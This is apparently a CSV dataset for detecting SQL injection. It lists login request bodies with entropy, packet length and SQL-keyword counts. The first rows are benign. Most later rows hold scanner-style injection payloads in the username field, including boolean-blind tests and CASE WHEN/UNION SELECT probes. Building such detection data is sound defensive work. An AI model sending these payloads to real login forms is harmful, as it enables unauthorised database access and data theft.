,body,entropy,packet_length,sqli_keywords
0,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
1,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
2,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
3,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
4,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
5,uname=fdsfds&pass=fsdfsdf,3.0790795706241743,25,0
6,"uname=fdsfds('.,).())""&pass=fsdfsdf",3.7614457889184734,51,7
7,"uname=fdsfds'noRNHL<'"">LpuoRO&pass=fsdfsdf",4.127569435189147,52,5
8,uname=fdsfds') AND 7963=5189 AND ('kQpo'='kQpo&pass=fsdfsdf,4.528841303922395,83,9
9,uname=fdsfds') AND 7318=7318 AND ('PLEc'='PLEc&pass=fsdfsdf,4.473839397179402,83,9
10,uname=fdsfds' AND 6003=5395 AND 'Jzir'='Jzir&pass=fsdfsdf,4.409742374186429,77,7
11,uname=fdsfds' AND 6003=5395 AND 'Jzir'='Jzir&pass=fsdfsdf,4.409742374186429,77,7
12,uname=fdsfds' AND 7318=7318 AND 'CasW'='CasW&pass=fsdfsdf,4.190615619876376,77,7
13,uname=fdsfds' AND 7318=7318 AND 'CasW'='CasW&pass=fsdfsdf,4.190615619876376,77,7
14,uname=fdsfds) AND 1722=9557 AND (9423=9423&pass=fsdfsdf,4.329099659325982,71,6
15,uname=fdsfds) AND 1722=9557 AND (9423=9423&pass=fsdfsdf,4.329099659325982,71,6
16,uname=fdsfds) AND 7318=7318 AND (2426=2426&pass=fsdfsdf,4.342824886638045,71,6
17,uname=fdsfds) AND 7318=7318 AND (2426=2426&pass=fsdfsdf,4.342824886638045,71,6
18,uname=fdsfds AND 7762=3403&pass=fsdfsdf,4.057855988582063,45,2
19,uname=fdsfds AND 7762=3403&pass=fsdfsdf,4.057855988582063,45,2
20,uname=fdsfds AND 7318=7318&pass=fsdfsdf,3.955291886017961,45,2
21,uname=fdsfds AND 7318=7318&pass=fsdfsdf,3.955291886017961,45,2
22,uname=fdsfds AND 4997=9323-- UYdt&pass=fsdfsdf,4.241089815628947,54,3
23,uname=fdsfds AND 4997=9323-- UYdt&pass=fsdfsdf,4.241089815628947,54,3
24,uname=fdsfds AND 7318=7318-- uijq&pass=fsdfsdf,4.249014336859389,54,3
25,uname=fdsfds AND 7318=7318-- uijq&pass=fsdfsdf,4.249014336859389,54,3
26,uname=(SELECT (CASE WHEN (9639=3170) THEN 0x666473666473 ELSE (SELECT 3170 UNION SELECT 9919) END))&pass=fsdfsdf,4.707812990110174,154,19
27,uname=(SELECT (CASE WHEN (9639=3170) THEN 0x666473666473 ELSE (SELECT 3170 UNION SELECT 9919) END))&pass=fsdfsdf,4.707812990110174,154,19
28,uname=(SELECT (CASE WHEN (3192=3192) THEN 0x666473666473 ELSE (SELECT 9867 UNION SELECT 8766) END))&pass=fsdfsdf,4.7533159177214195,154,19
29,uname=(SELECT (CASE WHEN (3192=3192) THEN 0x666473666473 ELSE (SELECT 9867 UNION SELECT 8766) END))&pass=fsdfsdf,4.7533159177214195,154,19
30,"uname=(SELECT CONCAT(CONCAT(0x7170766a71,(CASE WHEN (7078=7078) THEN 0x31 ELSE 0x30 END)),0x716a6b7671))&pass=fsdfsdf",4.745311085479342,159,23
